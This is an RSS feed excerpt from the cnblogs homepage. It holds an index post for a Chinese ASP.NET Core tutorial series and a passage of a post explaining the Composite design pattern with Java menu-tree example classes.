<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>Asp.NETCore轻松学系列阅读指引目录 - Ron.Liang</title>
<link>http://www.cnblogs.com/viter/p/10474091.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/viter/p/10474091.html</guid>
<description>&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
&lt;p&gt;耗时两个多月，坚持写这个入门系列文章，就是想给后来者更好更快的上手体验，这个系列可以说是从入门到进阶，适合没有 .NETCore 编程经验到小白同学，也适合从 .NET Framework 迁移到 .NETCore 的朋友。&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;本系列从安装环境开始，到认识各种配置文件、然后学习了自定过滤器实现、日志监视、异步任务、多线程、缓存使用、网络通讯、单元测试、常规部署到容器化部署等一系列等文章，每一篇文章都配置了示例代码Demo，大家可以通过每篇文章的末尾找到下载示例代码的链接。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;目前，所有的示例代码都托管在 GitHub 上：&lt;a href=&quot;https://github.com/lianggx/EasyAspNetCoreDemo&quot; class=&quot;uri&quot;&gt;https://github.com/lianggx/EasyAspNetCoreDemo&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;未来如果有新的文章，也会收集到此目录中。这个系列得到了很多朋友到大力支持，每一个点赞都是对我对鼓励，每一条评论我都会仔细的查看，对于提出的问题，也一一作出解答，愿本系列文章能给广大 .NETCore 爱好者们带来一些帮助。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;从安装到配置&quot;&gt;1. 从安装到配置&lt;/h2&gt;
&lt;h6 id=&quot;asp.net-core-轻松学-从安装环境开始&quot;&gt;1.1 &lt;a href=&quot;https://www.cnblogs.com/viter/p/10018158.html&quot;&gt;Asp.NET Core 轻松学-从安装环境开始&lt;/a&gt;&lt;/h6&gt;
&lt;h6 id=&quot;asp.net-core-轻松学-项目目录和文件作用介绍&quot;&gt;1.2 &lt;a href=&quot;https://www.cnblogs.com/viter/p/10026517.html&quot;&gt;Asp.NET Core 轻松学-项目目录和文件作用介绍&lt;/a&gt;&lt;/h6&gt;
&lt;h6 id=&quot;asp.net-core-轻松学-玩转配置文件&quot;&gt;1.3 &lt;a href=&quot;https://www.cnblogs.com/viter/p/10034597.html&quot;&gt;Asp.NET Core 轻松学-玩转配置文件&lt;/a&gt;&lt;/h6&gt;
&lt;h6 id=&quot;asp.net-core-深入了解配置文件加载过程&quot;&gt;1.4 &lt;a href=&quot;https://www.cnblogs.com/viter/p/9967936.html&quot;&gt;Asp.NET Core 深入了解配置文件加载过程&lt;/a&gt;&lt;/h6&gt;
&lt;h2 id=&quot;业务实现&quot;&gt;2. 业务实现&lt;/h2&gt;
&lt;h6 id=&quot;asp.net-core轻松学-业务重点-实现一个简单的手机号码验证&quot;&gt;2.1 &lt;a href=&quot;https://www.cnblogs.com/viter/p/10063423.html&quot;&gt;Asp.NET Core轻松学-业务重点-实现一个简单的手机号码验证&lt;/a&gt;&lt;/h6&gt;
&lt;h6 id=&quot;asp.net-core-轻松学-实现跨平台的自定义json数据包&quot;&gt;2.2 &lt;a href=&quot;https://www.cnblogs.com/viter/p/10056003.html&quot;&gt;Asp.NET Core 轻松学-实现跨平台的自定义Json数据包&lt;/a&gt;&lt;/h6&gt;
&lt;h6 id=&quot;asp.net-core-轻松学-利用swagger自动生成接口文档&quot;&gt;2.3 &lt;a href=&quot;https://www.cnblogs.com/viter/p/10053660.html&quot;&gt;Asp.NET Core 轻松学-利用Swagger自动生成接口文档&lt;/a&gt;&lt;/h6&gt;
&lt;h6 id=&quot;asp.net-core-轻松学-一行代码搞定文件上传&quot;&gt;2.4 &lt;a href=&quot;https://www.cnblogs.com/viter/p/10074766.html&quot;&gt;Asp.NET Core 轻松学-一行代码搞定文件上传&lt;/a&gt;&lt;/h6&gt;
&lt;h2 id=&quot;日志&quot;&gt;3. 日志&lt;/h2&gt;
&lt;h6 id=&quot;asp.net-core依赖注入和管道方式的异常处理及日志记录&quot;&gt;3.1 &lt;a href=&quot;https://www.cnblogs.com/viter/p/10013195.html&quot;&gt;Asp.NET Core依赖注入和管道方式的异常处理及日志记录&lt;/a&gt;&lt;/h6&gt;
&lt;h6 id=&quot;asp.net-core-轻松学-利用日志监视进行服务遥测&quot;&gt;3.2 &lt;a href=&quot;https://www.cnblogs.com/viter/p/10128637.html&quot;&gt;Asp.NET Core 轻松学-利用日志监视进行服务遥测&lt;/a&gt;&lt;/h6&gt;
&lt;h2 id=&quot;测试&quot;&gt;4. 测试&lt;/h2&gt;
&lt;h6 id=&quot;asp.net-core-轻松学-利用文件监视进行快速测试开发&quot;&gt;4.1 &lt;a href=&quot;https://www.cnblogs.com/viter/p/10098668.html&quot;&gt;Asp.NET Core 轻松学-利用文件监视进行快速测试开发&lt;/a&gt;&lt;/h6&gt;
&lt;h6 id=&quot;asp.net-core-轻松学-利用xunit进行主机级别的网络集成测试&quot;&gt;4.2 &lt;a href=&quot;https://www.cnblogs.com/viter/p/10091816.html&quot;&gt;Asp.NET Core 轻松学-利用xUnit进行主机级别的网络集成测试&lt;/a&gt;&lt;/h6&gt;
&lt;h2 id=&quot;缓存使用&quot;&gt;5. 缓存使用&lt;/h2&gt;
&lt;h6 id=&quot;asp.net-core-轻松学-在.netcore使用缓存和配置依赖策略&quot;&gt;5.1 &lt;a href=&quot;https://www.cnblogs.com/viter/p/10146312.html&quot;&gt;Asp.NET Core 轻松学-在.NETCore使用缓存和配置依赖策略&lt;/a&gt;&lt;/h6&gt;
&lt;h6 id=&quot;asp.net-core-轻松学-正确使用分布式缓存&quot;&gt;5.2 &lt;a href=&quot;https://www.cnblogs.com/viter/p/10161581.html&quot;&gt;Asp.NET Core 轻松学-正确使用分布式缓存&lt;/a&gt;&lt;/h6&gt;
&lt;h2 id=&quot;网络和通讯&quot;&gt;6.网络和通讯&lt;/h2&gt;
&lt;h6 id=&quot;asp.net-core-轻松学-httpclient的演进和避坑&quot;&gt;6.1 &lt;a href=&quot;https://www.cnblogs.com/viter/p/10086997.html&quot;&gt;Asp.NET Core 轻松学-HttpClient的演进和避坑&lt;/a&gt;&lt;/h6&gt;
&lt;h6 id=&quot;asp.net-core-轻松学-基于微服务的后台任务调度管理器&quot;&gt;6.2 &lt;a href=&quot;https://www.cnblogs.com/viter/p/10078488.html&quot;&gt;Asp.NET Core 轻松学-基于微服务的后台任务调度管理器&lt;/a&gt;&lt;/h6&gt;
&lt;h2 id=&quot;异步和多线程&quot;&gt;7. 异步和多线程&lt;/h2&gt;
&lt;h6 id=&quot;asp.net-core-轻松学-多线程之取消令牌&quot;&gt;7.1 &lt;a href=&quot;https://www.cnblogs.com/viter/p/10184223.html&quot;&gt;Asp.NET Core 轻松学-多线程之取消令牌&lt;/a&gt;&lt;/h6&gt;
&lt;h6 id=&quot;asp.net-core-轻松学-多线程之task快速上手&quot;&gt;7.2 &lt;a href=&quot;https://www.cnblogs.com/viter/p/10201228.html&quot;&gt;Asp.NET Core 轻松学-多线程之Task快速上手&lt;/a&gt;&lt;/h6&gt;
&lt;h6 id=&quot;asp.net-core-轻松学-多线程之task补充&quot;&gt;7.3 &lt;a href=&quot;https://www.cnblogs.com/viter/p/10206648.html&quot;&gt;Asp.NET Core 轻松学-多线程之Task(补充)&lt;/a&gt;&lt;/h6&gt;
&lt;h6 id=&quot;asp.net-core-轻松学-经常使用异步的你可能需要看看这个文章&quot;&gt;7.4 &lt;a href=&quot;https://www.cnblogs.com/viter/p/10271212.html&quot;&gt;Asp.NET Core 轻松学-经常使用异步的你,可能需要看看这个文章&lt;/a&gt;&lt;/h6&gt;
&lt;h2 id=&quot;访问数据库&quot;&gt;8. 访问数据库&lt;/h2&gt;
&lt;h6 id=&quot;asp.net-core-轻松学-10分钟使用efcore连接mssql数据库&quot;&gt;8.1 &lt;a href=&quot;https://www.cnblogs.com/viter/p/10243577.html&quot;&gt;Asp.NET Core 轻松学-10分钟使用EFCore连接MSSQL数据库&lt;/a&gt;&lt;/h6&gt;
&lt;h6 id=&quot;asp.net-core-轻松学-使用mariadbmysqlpostgresql和支持多个上下文对象&quot;&gt;8.2 &lt;a href=&quot;https://www.cnblogs.com/viter/p/10295852.html&quot;&gt;Asp.NET Core 轻松学-使用MariaDB/MySql/PostgreSQL和支持多个上下文对象&lt;/a&gt;&lt;/h6&gt;
&lt;h2 id=&quot;扩展使用&quot;&gt;9. 扩展使用&lt;/h2&gt;
&lt;h6 id=&quot;asp.net-core轻松学-实现一个轻量级高可复用的rabbitmq客户端&quot;&gt;9.1 &lt;a href=&quot;https://www.cnblogs.com/viter/p/10003185.html&quot;&gt;Asp.NET Core轻松学-实现一个轻量级高可复用的RabbitMQ客户端&lt;/a&gt;&lt;/h6&gt;
&lt;h6 id=&quot;asp.net-core轻松学-配置服务apollo部署实践&quot;&gt;9.2 &lt;a href=&quot;https://www.cnblogs.com/viter/p/9982452.html&quot;&gt;Asp.NET Core轻松学-配置服务Apollo部署实践&lt;/a&gt;&lt;/h6&gt;
&lt;h6 id=&quot;asp.net-core-轻松学-在.netcore中使用钩子&quot;&gt;9.3 &lt;a href=&quot;https://www.cnblogs.com/viter/p/10140697.html&quot;&gt;Asp.NET Core 轻松学-在.NETCore中使用钩子&lt;/a&gt;&lt;/h6&gt;
&lt;h2 id=&quot;托管部署&quot;&gt;10. 托管部署&lt;/h2&gt;
&lt;h6 id=&quot;asp.net-core轻松学-部署到iis进行托管&quot;&gt;10.1 &lt;a href=&quot;https://www.cnblogs.com/viter/p/10388902.html&quot;&gt;Asp.NET Core轻松学-部署到IIS进行托管&lt;/a&gt;&lt;/h6&gt;
&lt;h6 id=&quot;asp.net-core轻松学-部署到linux进行托管&quot;&gt;10.2 &lt;a href=&quot;https://www.cnblogs.com/viter/p/10408012.html&quot;&gt;Asp.NET Core轻松学-部署到Linux进行托管&lt;/a&gt;&lt;/h6&gt;
&lt;h6 id=&quot;asp.net-core轻松学-使用supervisor进行托管部署&quot;&gt;10.3 &lt;a href=&quot;https://www.cnblogs.com/viter/p/10441409.html&quot;&gt;Asp.NET Core轻松学-使用Supervisor进行托管部署&lt;/a&gt;&lt;/h6&gt;
&lt;h6 id=&quot;asp.net-core轻松学-使用docker进行容器化托管&quot;&gt;10.4 &lt;a href=&quot;https://www.cnblogs.com/viter/p/10463907.html&quot;&gt;Asp.NET Core轻松学-使用Docker进行容器化托管&lt;/a&gt;&lt;/h6&gt;
&lt;h2 id=&quot;结束语&quot;&gt;结束语&lt;/h2&gt;
&lt;p&gt;通过书写这个系列的文章，个人对 .NETCore 的认识又得到了进一步对提高和加强，也认识了很多同行，感谢陈主席、感谢马桶、感谢微软广州俱乐部的兄弟姐们，感谢微软Azure提供免费测试服务器，真的很方便。&lt;/p&gt;
&lt;p&gt;最后，推广一下广州.NET微软技术俱乐部，欢迎更多的朋友加入我们 .NETCore 这个大家庭、一起学习交流。QQ群：651477282。&lt;/p&gt;
</description>
<pubDate>Mon, 04 Mar 2019 23:39:00 +0000</pubDate>
<dc:creator>Ron.Liang</dc:creator>
<og:description>前言 耗时两个多月，坚持写这个入门系列文章，就是想给后来者更好更快的上手体验，这个系列可以说是从入门到进阶，适合没有 .NETCore 编程经验到小白同学，也适合从 .NET Framework 迁移</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/viter/p/10474091.html</dc:identifier>
</item>
<item>
<title>优雅的处理树状结构——组合模式总结 - dashuai的博客</title>
<link>http://www.cnblogs.com/kubixuesheng/p/10353328.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/kubixuesheng/p/10353328.html</guid>
<description>&lt;p&gt;本模式经 &lt;a id=&quot;cb_post_title_url&quot; class=&quot;postTitle2&quot; href=&quot;https://www.cnblogs.com/kubixuesheng/p/5183739.html&quot;&gt;遍历“容器”的优雅方法——总结迭代器模式&lt;/a&gt; 引出，继续看最后的子菜单的案例&lt;/p&gt;

&lt;p&gt;组合模式，也叫 Composite 模式……是构造型的设计模式之一。&lt;/p&gt;
&lt;blockquote class=&quot;ct-blockquote&quot; readability=&quot;9&quot;&gt;
&lt;p&gt;组合模式允许对象组合成树形结构，来表现“整体/部分”的层次结构，使得客户端对单个对象和组合对象的使用具有一致性。&lt;/p&gt;
&lt;p&gt;Composite Pattern&lt;/p&gt;
&lt;p&gt;Compose objects into tree structures to represent part-whole hierarchies. Composite lets clients treat individual objects and compositions of objects uniformly.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;有一些拗口，通俗的说：组合模式是关于怎样将对象形成树形结构来表现整体和部分的层次结构的成熟模式。&lt;/p&gt;
&lt;p&gt;使用组合模式，可以让用户以一致的方式处理个体对象和组合对象，组合模式的关键在于无论是个体对象还是组合对象都实现了相同的接口或都是同一个抽象类的子类。 &lt;/p&gt;
&lt;p&gt;即，组合模式，它能通过递归来构造树形的对象结构，并可以通过一个对象来访问整个对象树。&lt;/p&gt;
&lt;p&gt;即，组合模式，在大多数情况下，可以让客户端忽略对象个体和对象组合之间的差异。&lt;/p&gt;
&lt;h2&gt;2.1、组合模式的角色和类图&lt;/h2&gt;
&lt;p&gt;结合数据结构里的树，其实很好写出来。无非就是叶子和非叶子节点的的组合。&lt;/p&gt;
&lt;p&gt;1、需要一个类为叶子节点和非叶子节点的共同抽象父类，如图里的 Component 接口（抽象类也可以），是树形结构的节点的抽象：&lt;/p&gt;
&lt;ul readability=&quot;0.5&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;为所有的对象，包括叶子节点，定义统一的接口（公共属性，行为等的定义）&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;提供管理子节点对象的接口方法&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;[可选]提供管理父节点对象的接口方法 &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;2、设计一个 Leaf 类代表树的叶节点，这个要单独拿出来区分，是 Component 的实现子类&lt;/p&gt;
&lt;p&gt;3、设计一个 Composite 类作为树枝节点，即非叶节点，也是 Component 的实现子类&lt;/p&gt;
&lt;p&gt;4、client 客户端，它使用 Component 接口操作树&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/682679/201903/682679-20190303210639992-1131474850.png&quot; alt=&quot;&quot; width=&quot;627&quot; height=&quot;359&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;id-2.2、组合（Composite）、组件（Component接口）、树的关系&quot;&gt;2.2、组合（Composite）、组件（Component接口）、和树的关系&lt;/h2&gt;
&lt;p&gt;在该模式里熟悉一些定义，其实没必要死记硬背，定义随便起名字，只要能自洽即可。&lt;/p&gt;
&lt;p&gt;1、组合（Composite）包含了组件（Component）&lt;/p&gt;
&lt;p&gt;2、组件 Component 接口 = 组合Composite + 叶节点Leaf，因为组件是抽象的，叶子和枝节点（组合）是组件的具体表现，很好理解。&lt;/p&gt;
&lt;p&gt;其实就是递归，得到的是由上而下的树形结构，根部是一个组合Composite，而组合的分支延伸展开（组合包含了组件），直至叶子节点leaf为止。&lt;/p&gt;

&lt;p&gt;如菜单子系统的实现，就是典型的树状结构&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/682679/201903/682679-20190303210608456-958671541.png&quot; alt=&quot;&quot; width=&quot;758&quot; height=&quot;207&quot;/&gt;&lt;/p&gt;
&lt;p&gt;需要一个抽象组件 Component，例子里是 MenuComponent，作为菜单节点和菜单节点项（叶子）的共同接口，能够让客户端使用统一的方法来操作菜单和菜单项。&lt;/p&gt;
&lt;p&gt;如下，所有的组件（叶子+树枝（非叶子））都必须实现这个组件接口，又因为叶子节点（即菜单项）和树枝节点（即组合节点）分工不同，所以需要在抽象的组件类中实现默认的方法，因为某些方法可能只在某类节点中有意义。一般是做抛出运行时异常（自定义的异常）的处理。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * 菜单和菜单项的抽象——组件，让菜单和菜单项能共用
 * 又因为希望这个抽象组件能提供一些默认的操作，故使用了抽象类
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;abstract&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; MenuComponent {
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; add(MenuComponent menuComponent) {
        &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; UnsupportedOperationException();
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; remove(MenuComponent menuComponent) {
        &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; UnsupportedOperationException();
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; MenuComponent getChild(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; i) {
        &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; UnsupportedOperationException();
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getName() {
        &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; UnsupportedOperationException();
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getDescription() {
        &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; UnsupportedOperationException();
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;double&lt;/span&gt;&lt;span&gt; getPrice() {
        &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; UnsupportedOperationException();
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; isVegetarian() {
        &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; UnsupportedOperationException();
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; print() {
        &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; UnsupportedOperationException();
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;下面编写叶子节点——菜单的菜单项类。&lt;/p&gt;
&lt;p&gt;这是组合模式类图里的叶子角色，它只负责实现组合的内部元素的行为，因此宏观上管理整个菜单的方法，比如 add 、remove 等，它不应该复写，对她没有意义。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * 叶子节点，代表菜单里的一项
 * 只复写对其有意义的方法，没有意义的方法，比如获得子节点等，就不理会即可
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; MenuItem &lt;span&gt;extends&lt;/span&gt;&lt;span&gt; MenuComponent {
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String name;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String description;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; vegetarian;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;double&lt;/span&gt;&lt;span&gt; price;

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; MenuItem(String name, String description, &lt;/span&gt;&lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; vegetarian, &lt;/span&gt;&lt;span&gt;double&lt;/span&gt;&lt;span&gt; price) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.name =&lt;span&gt; name;
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.description =&lt;span&gt; description;
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.vegetarian =&lt;span&gt; vegetarian;
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.price =&lt;span&gt; price;
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getName() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; name;
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getDescription() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; description;
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;double&lt;/span&gt;&lt;span&gt; getPrice() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; price;
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; isVegetarian() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; vegetarian;
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; print() {
        System.out.print(&lt;/span&gt;&quot;  &quot; +&lt;span&gt; getName());
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isVegetarian()) {
            System.out.print(&lt;/span&gt;&quot;(v)&quot;&lt;span&gt;);
        }

        System.out.println(&lt;/span&gt;&quot;, &quot; +&lt;span&gt; getPrice());
        System.out.println(&lt;/span&gt;&quot;     -- &quot; +&lt;span&gt; getDescription());
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;下面，编写树枝节点——菜单，也就是组合类。&lt;/p&gt;
&lt;p&gt;之前的菜单项是的单个的组件类，而组合类才体现了递归思想，组合类聚合了组件类。一些对其没有意义的方法，同样不需要复写实现。&lt;/p&gt;
&lt;p&gt;菜单也可以有子菜单（菜单项其实本质也可以是子菜单），所以组合了一个 Arraylist&amp;lt;MenuComponent&amp;gt;，因为菜单和菜单项都属于 MenuComponent，那么使用同样的方法，可以兼顾两者，这正应了组合模式的意义——&lt;span&gt;&lt;strong&gt;使用组合模式，可以让用户以一致的方式处理个体对象和组合对象，组合模式的关键在于无论是个体对象还是组合对象都实现了相同的接口或都是同一个抽象类的子类。 &lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * 树枝节点，也就是组合节点——代表各个菜单
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; Menu &lt;span&gt;extends&lt;/span&gt;&lt;span&gt; MenuComponent {
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String name;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String description;
    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 依赖了菜单组件，递归的实现
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; List&amp;lt;MenuComponent&amp;gt; menuComponents = &lt;span&gt;new&lt;/span&gt; ArrayList&amp;lt;&amp;gt;&lt;span&gt;();

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Menu(String name, String description) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.name =&lt;span&gt; name;
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.description =&lt;span&gt; description;
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; add(MenuComponent menuComponent) {
        menuComponents.add(menuComponent);
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; remove(MenuComponent menuComponent) {
        menuComponents.remove(menuComponent);
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; MenuComponent getChild(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; i) {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; menuComponents.get(i);
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getName() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; name;
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getDescription() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; description;
    }

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 因为菜单作为树枝节点，它是一个组合，包含了菜单项和其他的子菜单，所以 print()应该打印出它包含的一切。
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; print() {
        System.out.print(&lt;/span&gt;&quot;\n&quot; +&lt;span&gt; getName());
        System.out.println(&lt;/span&gt;&quot;, &quot; +&lt;span&gt; getDescription());
        System.out.println(&lt;/span&gt;&quot;---------------------&quot;&lt;span&gt;);

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 使用了迭代器（迭代器模式和组合模式的有机结合），遍历菜单的菜单项&lt;/span&gt;
        Iterator iterator =&lt;span&gt; menuComponents.iterator();
        &lt;/span&gt;&lt;span&gt;while&lt;/span&gt;&lt;span&gt; (iterator.hasNext()) { 
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 打印这个节点包含的一切，print 可以兼顾两类节点，这是组合模式的特点&lt;/span&gt;
            MenuComponent menuComponent =&lt;span&gt; (MenuComponent) iterator.next();
            menuComponent.print(); &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 递归思想的应用&lt;/span&gt;
&lt;span&gt;        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;因为菜单是一个组合，包含了菜单项和其他的子菜单，所以它的print()应该打印出它包含的一切，此时递归思想派上了用场。&lt;/p&gt;
&lt;p&gt;下面编写客户端——服务员类&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * 客户端，也就是服务员类，聚合了菜单组件接口（这里是抽象类）控制菜单，解耦合
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Waitress {
    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 聚合了菜单组件——这一抽象节点，能兼顾叶子节点和树枝节点
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt;&lt;span&gt; MenuComponent allMenus;

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Waitress(MenuComponent allMenus) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.allMenus =&lt;span&gt; allMenus;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; printMenu() {
        allMenus.print();
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;客户端类代码很简单，只需要聚合一个顶层的组件接口即可。最顶层的菜单组件可以兼顾所有菜单或者菜单项，故客户端只需要调用一次最顶层的print方法，即可打印整个菜单系统。&lt;/p&gt;
